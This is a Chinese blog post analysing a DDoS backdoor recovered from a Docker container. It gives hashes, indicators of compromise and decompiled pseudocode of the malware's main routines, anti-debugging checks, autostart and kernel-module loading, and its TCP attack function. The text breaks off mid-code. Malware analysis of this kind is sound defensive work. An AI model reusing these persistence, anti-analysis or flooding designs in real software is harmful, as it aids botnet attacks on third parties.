<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>挖矿病毒事件的后门分析 | lan1ocのblog</title><meta name="author" content="lan1oc"><meta name="copyright" content="lan1oc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="取样是个ddos安全事件的涉事后门程序在一个docker镜像里面，先取出来 1sudo docker cp 714c4f043f67:&#x2F;tmp&#x2F;4311 .&#x2F;4311 然后打包 1zip 4311.zip 4311  mcp分析直接拷打然后分析的感觉还行，基本信息都出来了，是什么功能，怎么个机制大致都分析了，接着就是针对性拷打就行 基本信息文件类型: Linux ELF可执行文件 (32位)基地址">
<meta property="og:type" content="article">
<meta property="og:title" content="挖矿病毒事件的后门分析">
<meta property="og:url" content="https://lan1oc.github.io/2025/12/30/%E5%B7%A5%E4%BD%9C/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="lan1ocのblog">
<meta property="og:description" content="取样是个ddos安全事件的涉事后门程序在一个docker镜像里面，先取出来 1sudo docker cp 714c4f043f67:&#x2F;tmp&#x2F;4311 .&#x2F;4311 然后打包 1zip 4311.zip 4311  mcp分析直接拷打然后分析的感觉还行，基本信息都出来了，是什么功能，怎么个机制大致都分析了，接着就是针对性拷打就行 基本信息文件类型: Linux ELF可执行文件 (32位)基地址">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lan1oc.github.io/img/c1/3.webp">
<meta property="article:published_time" content="2025-12-29T16:00:00.000Z">
<meta property="article:modified_time" content="2025-12-29T16:00:00.000Z">
<meta property="article:author" content="lan1oc">
<meta property="article:tag" content="干中学">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://lan1oc.github.io/img/c1/3.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "挖矿病毒事件的后门分析",
  "url": "https://lan1oc.github.io/2025/12/30/%E5%B7%A5%E4%BD%9C/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/",
  "image": "https://lan1oc.github.io/img/c1/3.webp",
  "datePublished": "2025-12-29T16:00:00.000Z",
  "dateModified": "2025-12-29T16:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "lan1oc",
      "url": "https://lan1oc.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/1.ico"><link rel="canonical" href="https://lan1oc.github.io/2025/12/30/%E5%B7%A5%E4%BD%9C/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '挖矿病毒事件的后门分析',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/4.webp);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/c1/3.webp);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">lan1ocのblog</span></a><a class="nav-page-title" href="/"><span class="site-name">挖矿病毒事件的后门分析</span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">挖矿病毒事件的后门分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-29T16:00:00.000Z" title="发表于 2025-12-30 00:00:00">2025-12-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-29T16:00:00.000Z" title="更新于 2025-12-30 00:00:00">2025-12-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/">逆向分析</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="取样"><a href="#取样" class="headerlink" title="取样"></a>取样</h1><p>是个ddos安全事件的涉事后门程序<br>在一个docker镜像里面，先取出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp 714c4f043f67:/tmp/4311 ./4311</span><br></pre></td></tr></table></figure>
<p>然后打包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip 4311.zip 4311</span><br></pre></td></tr></table></figure>
<p><img src="/../../../images/%E9%80%86%E5%90%91/Pasted%20image%2020251231131556.png"></p>
<h1 id="mcp分析"><a href="#mcp分析" class="headerlink" title="mcp分析"></a>mcp分析</h1><p>直接拷打<br><img src="/../../../images/%E9%80%86%E5%90%91/Pasted%20image%2020251231134438.png"><br>然后分析的感觉还行，基本信息都出来了，是什么功能，怎么个机制大致都分析了，接着就是针对性拷打就行</p>
<h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>文件类型: Linux ELF可执行文件 (32位)<br>基地址: 0x8048000<br>文件大小: 1,219,219字节<br>编译语言: C++ (GCC)<br>MD5: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">14ef2b9010f62696a49cfb6e1aa9e6e0</span><br></pre></td></tr></table></figure>
<p>SHA256: </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">70a7c6a15661cafb739e3acaf6b1cc2a1cf85d4881c173c418cc1c804597835b</span><br></pre></td></tr></table></figure>
<p>威胁等级: 高危</p>
<h2 id="恶意行为分析"><a href="#恶意行为分析" class="headerlink" title="恶意行为分析"></a>恶意行为分析</h2><h3 id="1-多功能恶意软件"><a href="#1-多功能恶意软件" class="headerlink" title="1. 多功能恶意软件"></a>1. 多功能恶意软件</h3><p>这是一个高度复杂的多功能恶意软件，具有以下主要功能：<br>DDoS攻击工具: 支持多种攻击类型<br>后门程序: 提供远程控制能力<br>监控程序: 系统监控和数据收集<br>系统工具: 系统级操作和配置</p>
<h3 id="2-支持的攻击类型"><a href="#2-支持的攻击类型" class="headerlink" title="2. 支持的攻击类型"></a>2. 支持的攻击类型</h3><h4 id="网络层攻击"><a href="#网络层攻击" class="headerlink" title="网络层攻击:"></a>网络层攻击:</h4><p>TCP攻击 (CTcpAttack): 建立TCP连接并发送数据<br>UDP洪水 (CAttackUdp): UDP包洪水攻击<br>SYN洪水 (CAttackSyn): TCP SYN包洪水<br>ICMP攻击 (CAttackIcmp): ICMP包攻击<br>DNS放大 (CAttackDns): DNS放大攻击<br>放大攻击 (CAttackAmp): 使用放大技术<br>代理攻击 (CAttackPrx): 通过代理进行攻击</p>
<h4 id="应用层攻击"><a href="#应用层攻击" class="headerlink" title="应用层攻击:"></a>应用层攻击:</h4><p>CC攻击 (CAttackCc): 针对特定协议<br>TNS攻击 (CAttackTns): Oracle TNS协议攻击<br>IE攻击 (CAttackIe): 针对Internet Explorer<br>压缩攻击 (CAttackCompress): 压缩数据攻击</p>
<h3 id="3-核心功能分析"><a href="#3-核心功能分析" class="headerlink" title="3. 核心功能分析"></a>3. 核心功能分析</h3><h4 id="主程序流程"><a href="#主程序流程" class="headerlink" title="主程序流程:"></a>主程序流程:</h4><p>main() -&gt; 根据g_iGatesType选择模式:  0: MainMonitor()     &#x2F;&#x2F; 监控模式  1: MainBeikong()     &#x2F;&#x2F; 贝壳模式    2: MainBackdoor()    &#x2F;&#x2F; 后门模式  3: MainSystool()     &#x2F;&#x2F; 系统工具模式</p>
<h4 id="反分析机制"><a href="#反分析机制" class="headerlink" title="反分析机制:"></a>反分析机制:</h4><p>检测父进程是否为gdb调试器<br>文件完整性检查（文件大小验证）<br>进程ID锁定机制</p>
<h4 id="持久化机制"><a href="#持久化机制" class="headerlink" title="持久化机制:"></a>持久化机制:</h4><p>自启动设置（SetAutoStart）<br>守护进程模式（daemon）<br>进程锁定文件<br>内核模块加载（xpacket.ko）</p>
<h4 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信:"></a>网络通信:</h4><p>C&amp;C服务器通信<br>多协议支持（TCP&#x2F;UDP&#x2F;ICMP）<br>DNS缓存系统（300秒缓存）<br>连接超时处理（5000ms）</p>
<h3 id="4-关键组件"><a href="#4-关键组件" class="headerlink" title="4. 关键组件"></a>4. 关键组件</h3><h4 id="配置管理"><a href="#配置管理" class="headerlink" title="配置管理:"></a>配置管理:</h4><p>CCmdDoing: 命令处理<br>CConfigDoing: 配置处理<br>CStatBase: 统计基础<br>CProvinceDns: 省份DNS映射</p>
<h4 id="资源管理"><a href="#资源管理" class="headerlink" title="资源管理:"></a>资源管理:</h4><p>CAmpResource: 放大攻击资源（&#x2F;usr&#x2F;lib&#x2F;libamplify.so）<br>CDNSCache: DNS缓存<br>CManager: 主管理器</p>
<h4 id="网络基础"><a href="#网络基础" class="headerlink" title="网络基础:"></a>网络基础:</h4><p>CNetBase: 网络基础功能<br>CPacketAttack: 包攻击基类<br>各种协议头构造器</p>
<h3 id="5-感染指标-IoC"><a href="#5-感染指标-IoC" class="headerlink" title="5. 感染指标 (IoC)"></a>5. 感染指标 (IoC)</h3><h4 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统:"></a>文件系统:</h4><p>&#x2F;usr&#x2F;lib&#x2F;libamplify.so - 放大库<br>xpacket.ko - 内核模块<br>各种锁定文件</p>
<h4 id="网络"><a href="#网络" class="headerlink" title="网络:"></a>网络:</h4><p>连接到8.8.8.8, 8.8.4.4 (Google DNS)<br>本地环回地址127.0.0.1<br>动态目标IP地址</p>
<h4 id="进程"><a href="#进程" class="headerlink" title="进程:"></a>进程:</h4><p>守护进程运行<br>进程ID文件锁定<br>自启动配置</p>
<h2 id="进一步分析"><a href="#进一步分析" class="headerlink" title="进一步分析"></a>进一步分析</h2><p>问了下思路，然后告诉我一般逆向的分析思路都是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 获取文件基本信息 → 2. 分析入口点 → 3. 理解程序流程 → </span><br><span class="line">2. 识别关键函数 → 5. 分析攻击机制 → 6. 提取配置信息</span><br></pre></td></tr></table></figure>
<p>入口点分析<br><code>_start函数分析：</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是程序真正的入口点</span></span><br><span class="line"><span class="function"><span class="type">void</span> __usercall __noreturn <span class="title">start</span><span class="params">(<span class="type">int</span> a1@&lt;eax&gt;, <span class="type">void</span> (*a2)()@&lt;edx&gt;)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">// 清理环境，设置栈</span></span><br><span class="line">  <span class="keyword">xor</span> ebp, ebp                    <span class="comment">// 清空基址指针</span></span><br><span class="line">  pop esi                         <span class="comment">// 获取命令行参数数量</span></span><br><span class="line">  mov ecx, esp                    <span class="comment">// 保存栈指针</span></span><br><span class="line">  <span class="keyword">and</span> esp, <span class="number">0</span>FFFFFFF0h             <span class="comment">// 16字节对齐</span></span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 调用glibc的启动函数</span></span><br><span class="line">  __libc_start_main(main, esi, &amp;retaddr, _libc_csu_init, _libc_csu_fini, a2, &amp;v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后告诉我分析的结果：<br>	这是一个标准的Linux程序入口<br>	xor ebp, ebp 是Linux程序的标准开头<br>	最终调用了main函数，这是分析的核心<br><code>main函数的核心逻辑：</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1. 初始化：关闭文件描述符，设置权限</span></span><br><span class="line">    CSysTool::<span class="built_in">CloseAllFileDescs</span>(v10);</span><br><span class="line">    CSysTool::<span class="built_in">Ower6msf</span>(v11);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 反分析检查</span></span><br><span class="line">    <span class="keyword">if</span> (CFileOp::<span class="built_in">GetTgtFileSize</span>(file_path) != g_iFileSize)</span><br><span class="line">        MEMORY[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">// 崩溃程序</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(parent_path, <span class="string">&quot;gdb&quot;</span>))</span><br><span class="line">        MEMORY[<span class="number">0</span>] = <span class="number">0</span>;  <span class="comment">// 检测调试器</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. 初始化全局配置</span></span><br><span class="line">    <span class="built_in">HGrd9</span>();    <span class="comment">// 序列号</span></span><br><span class="line">    <span class="built_in">Mndyuf</span>();   <span class="comment">// 后门序列号  </span></span><br><span class="line">    <span class="built_in">BGtd98</span>();   <span class="comment">// 后门网关</span></span><br><span class="line">    <span class="built_in">Osdku6</span>();   <span class="comment">// 邮件列表</span></span><br><span class="line">    <span class="built_in">wer54</span>();    <span class="comment">// 网关列表</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. 根据模式选择执行</span></span><br><span class="line">    <span class="keyword">if</span> (g_iGatesType == <span class="number">1</span>) <span class="built_in">MainBeikong</span>();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (g_iGatesType == <span class="number">2</span>) <span class="built_in">MainBackdoor</span>();</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (g_iGatesType == <span class="number">3</span>) <span class="built_in">MainSystool</span>(argc, argv);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">MainMonitor</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>关键发现：<br>	反分析机制：检查文件大小和调试器<br>	多模式设计：4种不同的工作模式<br>	全局配置：5个配置字符串在运行时初始化</p>
<h3 id="攻击模式深度分析"><a href="#攻击模式深度分析" class="headerlink" title="攻击模式深度分析"></a>攻击模式深度分析</h3><p><code>监控模式 (MainMonitor)</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">MainMonitor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 成为守护进程</span></span><br><span class="line">    <span class="built_in">daemon</span>(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 进程锁定</span></span><br><span class="line">    CSysTool::<span class="built_in">MarkPid</span>(g_strML, g_iMoniLock, &amp;pid);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建监控线程</span></span><br><span class="line">    CThreadMonGates *thread = <span class="keyword">new</span> <span class="built_in">CThreadMonGates</span>(path);</span><br><span class="line">    thread-&gt;<span class="built_in">StartThread</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 每小时循环一次</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        _sleep(<span class="number">3600</span>);  <span class="comment">// 3600秒 = 1小时</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析：<br>	守护进程：后台运行，不受终端控制<br>	进程锁定：防止多实例运行<br>	监控线程：持续监控网关状态<br>	低频循环：每小时检查一次，节省资源<br><code>后门模式 (MainBackdoor)</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainBackdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">daemon</span>(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查是否已运行</span></span><br><span class="line">    <span class="keyword">if</span> (!CSysTool::<span class="built_in">IsPidExist</span>(lock_file)) &#123;</span><br><span class="line">        <span class="comment">// 标记进程</span></span><br><span class="line">        CSysTool::<span class="built_in">MarkPid</span>(lock_file, g_iBackdoorLock, &amp;pid);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置自启动</span></span><br><span class="line">        CUtility::<span class="built_in">SetAutoStart</span>(g_strBDSN, <span class="number">99</span>, &amp;result);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 处理系统工具</span></span><br><span class="line">        CSysTool::<span class="built_in">HandleSystools</span>(unk_8100D38, &amp;param);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 启动主进程</span></span><br><span class="line">        <span class="built_in">MainProcess</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分析：<br>	防重复运行：检查进程锁文件<br>	自启动机制：设置开机自动运行<br>	系统工具集成：可能包含其他恶意功能<br>	主进程启动：进入核心攻击逻辑<br><code>主进程 (MainProcess) - 核心攻击引擎</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 休眠2秒等待系统稳定</span></span><br><span class="line">    CUtility::<span class="built_in">Sleep</span>(<span class="number">2000</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 清理临时文件</span></span><br><span class="line">    CFileOp::<span class="built_in">RemoveFile</span>(update_temp_file);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化各种组件</span></span><br><span class="line">    CDNSCache::<span class="built_in">Initialize</span>(&amp;g_dnsCache, <span class="number">300</span>);</span><br><span class="line">    CConfigDoing::<span class="built_in">Initialize</span>(&amp;g_cnfgDoing);</span><br><span class="line">    CCmdDoing::<span class="built_in">Initialize</span>(&amp;g_cmdDoing);</span><br><span class="line">    CStatBase::<span class="built_in">Initialize</span>(&amp;g_statBase);</span><br><span class="line">    CProvinceDns::<span class="built_in">InitReadResource</span>(&amp;g_provinceDns);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 加载内核模块</span></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;insmod xpacket.ko&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 加载放大库</span></span><br><span class="line">    CAmpResource::<span class="built_in">InitReadResource</span>(&amp;g_AmpResource, <span class="string">&quot;/usr/lib/libamplify.so&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建管理器</span></span><br><span class="line">    g_pManager = <span class="keyword">new</span> <span class="built_in">CManager</span>();</span><br><span class="line">    g_pManager-&gt;<span class="built_in">Initialize</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置信号处理</span></span><br><span class="line">    _bsd_signal(<span class="number">9</span>, KillHandler);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 主循环</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">        CUtility::<span class="built_in">Sleep</span>(<span class="number">60000</span>);  <span class="comment">// 每分钟检查一次</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>核心发现：<br>	内核模块加载：insmod xpacket.ko - 加载网络包处理模块<br>	放大攻击库：&#x2F;usr&#x2F;lib&#x2F;libamplify.so - DNS放大攻击组件<br>	管理器架构：CManager负责协调各种攻击<br>	持续运行：无限循环，定期检查任务</p>
<h3 id="DDoS攻击机制详解"><a href="#DDoS攻击机制详解" class="headerlink" title="DDoS攻击机制详解"></a>DDoS攻击机制详解</h3><p><code>TCP攻击实现</code><br><code>CTcpAttack::Do</code>函数分析：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CTcpAttack::Do</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 调用虚函数（可能是UpdateCurVariant）</span></span><br><span class="line">    (*(<span class="built_in">void</span> (__cdecl **)(<span class="keyword">this</span>, <span class="type">unsigned</span> <span class="type">int</span>))(*(_DWORD *)<span class="keyword">this</span> + <span class="number">24</span>))(<span class="keyword">this</span>, param);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 过滤本地地址</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">inet_addr</span>(<span class="string">&quot;127.0.0.1&quot;</span>) == <span class="keyword">this</span>-&gt;target_ip) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建TCP socket</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;socket_fd = CNetBase::<span class="built_in">CreateSocket</span>(<span class="number">6</span>, &amp;result);  <span class="comment">// 6 = TCP</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 连接目标</span></span><br><span class="line">    <span class="keyword">if</span> (!CNetBase::<span class="built_in">Connect</span>(&amp;buffer, <span class="keyword">this</span>-&gt;socket_fd, target_ip, target_port, <span class="number">5000</span>, &amp;timeout)) &#123;</span><br><span class="line">        <span class="comment">// 发送数据</span></span><br><span class="line">        data_size = std::vector&lt;<span class="type">char</span>&gt;::<span class="built_in">size</span>(&amp;<span class="keyword">this</span>-&gt;send_data);</span><br><span class="line">        data_ptr = std::vector&lt;<span class="type">char</span>&gt;::<span class="keyword">operator</span>[](&amp;<span class="keyword">this</span>-&gt;send_data, <span class="number">0</span>);</span><br><span class="line">        CNetBase::<span class="built_in">Send</span>(&amp;buffer, <span class="keyword">this</span>-&gt;socket_fd, data_ptr, data_size, <span class="number">5000</span>, &amp;result);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 接收响应</span></span><br><span class="line">        recv_size = std::vector&lt;<span class="type">char</span>&gt;::<span class="built_in">size</span>(&amp;<span 